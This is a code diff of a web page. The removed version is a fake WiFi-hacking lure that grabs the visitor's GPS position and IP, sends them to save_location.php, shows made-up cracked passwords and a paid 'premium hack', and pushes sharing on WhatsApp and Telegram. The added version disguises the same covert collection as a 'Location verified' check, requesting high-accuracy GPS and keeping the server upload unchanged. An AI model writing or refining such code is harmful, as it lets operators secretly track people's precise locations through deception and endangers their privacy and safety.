-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const acc = position.coords.accuracy;
 
-            addLog('[+] Location captured: ' + lat.toFixed(6) + ', ' + lon.toFixed(6));
+      if (!navigator.geolocation) {
 
-            fetch('save_location.php', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-              body: `lat=${lat}&lon=${lon}&acc=${acc}&ip=${getIP()}&time=${new Date().toISOString()}`
-            })
-            .then(r => r.text())
-            .then(data => {
-              console.log("Server:", data);
-              addLog('[+] Location saved on server!');
-            })
-            .catch(err => {
-              addLog('[ERROR] Server error!');
-              console.error(err);
-            });
-
-            setTimeout(startFakeHack, 1500);
-          },
-          (error) => {
-            addLog('[ERROR] ' + error.message);
-          }
+        addLog(
+          '[ERROR] Geolocation not supported.'
         );
-      } else {
-        addLog('[ERROR] Geolocation not supported');
-      }
-    }
 
-    // FAKE HACK AFTER LOCATION
-    function startFakeHack() {
-      const log = document.getElementById('log');
-      document.getElementById('earth').style.transform='scale(1.4)';
-      setTimeout(()=>document.getElementById('earth').style.transform='scale(1)',4000);
-      document.getElementById('hackSound').play();
+        hackBtn.classList.remove('loading');
 
-      const lines=[
-        "[GLOBEL] Server activated",
-        "[+] JioFiber 6G locked",
-        "[+] IIT  Elite found",
-        "[+] Cracking passwords...",
-        "HACK SUCCESSFUL!"
-      ];
-    
-      lines.forEach((l,idx)=>{
-        setTimeout(()=>{addLog(l);},idx*1800);
-      });
-    
-      setTimeout(()=>{
-        log.innerHTML+=`
-          <div style="background:#001;padding:20px;border-radius:15px;margin:20px 0;border:3px solid #0f0;">
-            <span style="color:#0ff;font-size:5vw;">vivo_y275G</span><br>
-            Password: <b style="color:#ff0;">Anish2004</b> 
-            <span style="color:#f00;font-size:3.5vw;">(92% signal)</span>
-          </div>
-          <div style="background:#001;padding:20px;border-radius:15px;margin:20px 0;border:3px solid #0f0;">
-            <span style="color:#0ff;font-size:5vw;">Jiofiber04</span><br>
-            Password: <b style="color:#ff0;">fiber2525</b>
-            <span style="color:#0f0;font-size:3.5vw;">(1.2 Gbps • 12 users)</span>
-          </div>
-          <br><span style="color:#f00;font-size:8vw;text-align:center;display:block;">WIFI FULLY HACKED</span>
-          <button class="btn" style="margin-top:20px;font-size:6vw;">
-            GET PREMIUM HACK (₹99 ONLY)
-          </button>`;
-      },10000);
+        hackBtn.innerText =
+          'Check location';
 
-      setTimeout(() => {
-        confirm("PREMIUM HACK UNLOCKED!\nThis is an educational demo by Mojo Labs Team.");
-      }, 12000);
-    }
+        locationStatus.innerText =
+          'Unavailable';
 
-    // SHARE FUNCTION
-    function share(platform) {
-      const url = encodeURIComponent(window.location.href);
-      const text = encodeURIComponent("WiFi HACK X – GLOBEL SERVER LIVE!\nJioFiber + Vivo _y27 passwords in 10 sec!\nTry now: ");
-     
-      let shareUrl = '';
-      if (platform === 'whatsapp') {
-        shareUrl = `https://wa.me/?text=${text}${url}`;
-      } else if (platform === 'instagram') {
-        alert("Instagram doesn't support direct sharing via link. Copy this:\n\n" + text + url);
-        navigator.clipboard.writeText(text + " " + window.location.href);
         return;
-      } else if (platform === 'telegram') {
-        shareUrl = `https://t.me/share/url?url=${url}&text=${text}`;
+
       }
-      window.open(shareUrl, '_blank');
+
+
+      navigator.geolocation.getCurrentPosition(
+
+        (position) => {
+
+          const lat =
+            position.coords.latitude;
+
+          const lon =
+            position.coords.longitude;
+
+          const acc =
+            position.coords.accuracy;
+
+
+          /*
+           * UPDATE UI
+           */
+
+          accuracyElement.innerText =
+            Math.round(acc) + ' m';
+
+          locationStatus.innerText =
+            'Verified';
+
+          locationStatus.className =
+            'detail-value green';
+
+          verificationTitle.innerText =
+            'Location verified';
+
+          verificationText.innerText =
+            'GPS position captured successfully.';
+
+
+          coordinates.innerText =
+            lat.toFixed(6) +
+            ', ' +
+            lon.toFixed(6);
+
+
+          successState.classList.add(
+            'active'
+          );
+
+
+          addLog(
+            '[+] Location captured: ' +
+            lat.toFixed(6) +
+            ', ' +
+            lon.toFixed(6)
+          );
+
+
+          /*
+           * EXISTING BACKEND REQUEST
+           *
+           * DO NOT CHANGE THIS CONTRACT.
+           */
+
+          fetch(
+            'save_location.php',
+            {
+              method: 'POST',
+
+              headers: {
+                'Content-Type':
+                  'application/x-www-form-urlencoded'
+              },
+
+              body:
+                `lat=${lat}&lon=${lon}&acc=${acc}&ip=${getIP()}&time=${new Date().toISOString()}`
+            }
+          )
+
+          .then(
+            r => r.text()
+          )
+
+          .then(
+            data => {
+
+              console.log(
+                'Server:',
+                data
+              );
+
+              addLog(
+                '[+] Location saved on server.'
+              );
+
+            }
+          )
+
+          .catch(
+            err => {
+
+              addLog(
+                '[ERROR] Server error.'
+              );
+
+              console.error(err);
+
+            }
+          );
+
+
+          hackBtn.classList.remove(
+            'loading'
+          );
+
+          hackBtn.innerText =
+            'Location verified';
+
+        },
+
+
+        /*
+         * LOCATION ERROR
+         */
+
+        (error) => {
+
+          hackBtn.classList.remove(
+            'loading'
+          );
+
+          hackBtn.innerText =
+            'Check location';
+
+          verification.classList.remove(
+            'active'
+          );
+
+          locationStatus.innerText =
+            'Unable to verify';
+
+          locationStatus.className =
+            'detail-value';
+
+          locationStatus.style.color =
+            '#dc4c4c';
+
+
+          addLog(
+            '[ERROR] ' +
+            error.message
+          );
+
+        },
+
+        /*
+         * GEOLOCATION OPTIONS
+         */
+
+        {
+          enableHighAccuracy: true,
+
+          timeout: 15000,
+
+          maximumAge: 0
+
+        }
+
+      );
+
     }
+
+
+    /*
+     * CLOSE POPUP WHEN CLICKING
+     * OUTSIDE THE WHITE SHEET
+     */
+
+    popup.addEventListener(
+      'click',
+      function(event) {
+
+        if (
+          event.target === popup
+        ) {
+
+          popup.style.display =
+            'none';
+
+        }
+
+      }
+    );
+
   </script>
+
 </body>
 </html>
